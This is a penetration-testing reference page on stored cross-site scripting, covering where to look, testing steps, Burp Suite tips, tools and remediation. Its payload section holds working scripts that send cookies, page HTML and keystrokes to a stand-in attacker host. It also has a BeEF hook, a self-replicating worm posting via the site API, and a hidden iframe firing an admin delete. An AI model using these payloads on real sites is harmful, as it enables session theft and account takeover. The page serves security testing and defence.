# Stored / Persistent XSS

## Overview
Stored (Persistent) XSS occurs when an application accepts user input containing malicious script and permanently saves it in a backend store (database, file system, log, cache), then later serves that data to other users without proper encoding. Unlike reflected XSS, the payload does not need to be delivered to each victim individually — it executes automatically for every user who loads the affected page. This makes stored XSS significantly more dangerous and impactful at scale.

## How It Works
An attacker submits a payload (e.g., in a comment, profile field, message, product review, or any persisted user-controlled field) that gets stored in the application's database. When other users (or administrators) view the page that renders the stored content, the victim's browser interprets the payload as legitimate HTML/JavaScript and executes it. The script runs in the context of the vulnerable domain, giving the attacker full control over the victim's session within that origin. Admin panels displaying user-supplied data are especially critical targets since exploitation there results in privilege escalation.

## Impact
- Mass session hijacking — single payload steals tokens from all subsequent visitors
- Account takeover of all users who view the infected content
- Privilege escalation by targeting admin panels or internal dashboards
- Persistent defacement of public-facing pages
- Worm propagation — payload creates new infected posts/comments automatically
- Keylogging, form interception, and credential theft at scale
- Cryptomining or DDoS using all victims' browsers as botnets
- Data exfiltration of sensitive page content for every visitor

## Where to Look
- User-generated content: comments, reviews, forum posts, blog entries
- Profile fields: display name, bio, location, job title, social links, avatar URL
- Private/direct messaging systems
- Support ticket or help desk systems
- File upload filenames reflected in the UI
- Admin panels displaying user-submitted data (logs, feedback, error reports)
- Notification systems, audit logs
- Chat or collaboration features
- Product descriptions, tags, categories (if editable by users)
- Custom field values in CRM, project management, or e-commerce applications
- RSS/Atom feeds generated from user content
- Email template systems with user-controlled fields

## Testing Steps
1. Identify all input points that persist data and are later displayed to the same or other users.
2. Submit a unique benign probe string (e.g., `storedxss1234`) and identify all locations in the application where it is rendered.
3. Determine the HTML context at each rendering location.
4. Craft and inject an appropriate payload for that context.
5. Log out (or use a different browser/session) and navigate to the page where the stored content is displayed.
6. Verify if the payload executes in the new session (confirms stored XSS, not just self-XSS).
7. Test in contexts visible to privileged users — submit payload in a support ticket and check if it fires in the admin view.
8. Test rich-text editors and WYSIWYG fields for HTML injection even when plain-text is expected.
9. Check API endpoints that accept and return user data for JSON-context stored XSS.
10. Verify if the payload survives editing, preview, and export functions.

## Payloads / Techniques

**Basic stored payload:**
```html
<script>alert(document.domain)</script>
```

**Session cookie exfiltration (fires on every visitor):**
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Fetch with full page content exfiltration:**
```html
<script>
fetch('https://attacker.com/exfil', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    url: location.href,
    html: document.documentElement.innerHTML
  })
});
</script>
```

**XSS worm (self-replicating via API):**
```html
<script>
fetch('/api/posts', {
  method: 'POST',
  headers: {'Content-Type': 'application/json', 'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').content},
  body: JSON.stringify({content: '<script>/* worm payload */<\/script>'})
});
</script>
```

**Keylogger:**
```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key));
});
</script>
```

**Beef hook (Browser Exploitation Framework):**
```html
<script src="https://attacker.com:3000/hook.js"></script>
```

**Hidden iframe for CSRF actions:**
```html
<iframe src="https://victim.com/admin/delete?user=admin" style="display:none"></iframe>
```

**Payload in username field (fires in admin audit log):**
```
"><svg onload=fetch(`https://attacker.com/?c=${btoa(document.cookie)})>
```

**Payload for rich-text editor bypass:**
```html
<img src="x" onerror="this.src='https://attacker.com/?c='+document.cookie">
```

## Burp Suite Tips
- Use **Burp Scanner** to crawl and actively test all stored input fields; it submits payloads and then visits pages that render them.
- When testing manually, use **Repeater** to submit your payload and **Proxy's history** to find all locations that render the stored value.
- Set up a **Burp Collaborator** payload for out-of-band detection when the payload executes in admin views you can't access: `<script>new Image().src='https://YOUR-COLLABORATOR.burpcollaborator.net/'</script>`
- Use **Intruder** to fuzz all stored fields with a comprehensive XSS payload list to find which ones are not sanitized.
- Enable **Logger++** Burp extension to search across all responses for injected probe strings.
- Use the **"Organize" → "Find comments"** feature or Search to track where your probe string appears across multiple responses.
- In the **DOM Invader** tool, enable stored XSS scanning to detect when injected canaries appear in the DOM.

## Tools
- Burp Suite Pro (Scanner, Collaborator, DOM Invader)
- OWASP ZAP
- XSStrike — https://github.com/s0md3v/XSStrike
- Dalfox — https://github.com/hahwul/dalfox
- BeEF (Browser Exploitation Framework) — https://beefproject.com/
- SQLMap (if input is stored via SQL) — https://sqlmap.org/
- ffuf / wfuzz for parameter discovery
- Hackvertor (Burp extension) for encoding

## Remediation
- **Output encoding**: Apply context-sensitive encoding (HTML entities, JS string escaping, CSS encoding, URL encoding) at render time — not just at input time.
- **Input validation**: Reject or strip HTML tags and JavaScript in fields that do not require rich text. Use an allowlist of permitted characters.
- **HTML sanitization for rich text**: Use a well-maintained library such as DOMPurify (JavaScript) or Bleach (Python) to sanitize HTML before storage and before rendering. Do NOT write your own sanitizer.
- **Content Security Policy (CSP)**: Deploy a strict CSP to block inline scripts and restrict external script sources. Use nonce-based CSP for maximum effectiveness.
- **HttpOnly cookies**: Prevent JavaScript from accessing session tokens.
- **Stored content review**: For admin-visible content, implement moderation queues or re-sanitize at render time regardless of what was stored.
- **Separate origins for user content**: Serve user-generated content from a sandboxed subdomain to limit the impact of XSS (e.g., `ugc.example.com` instead of `www.example.com`).

## References
https://owasp.org/www-community/attacks/xss/
https://portswigger.net/web-security/cross-site-scripting/stored
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
https://portswigger.net/research/stored-xss-cheat-sheet
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting
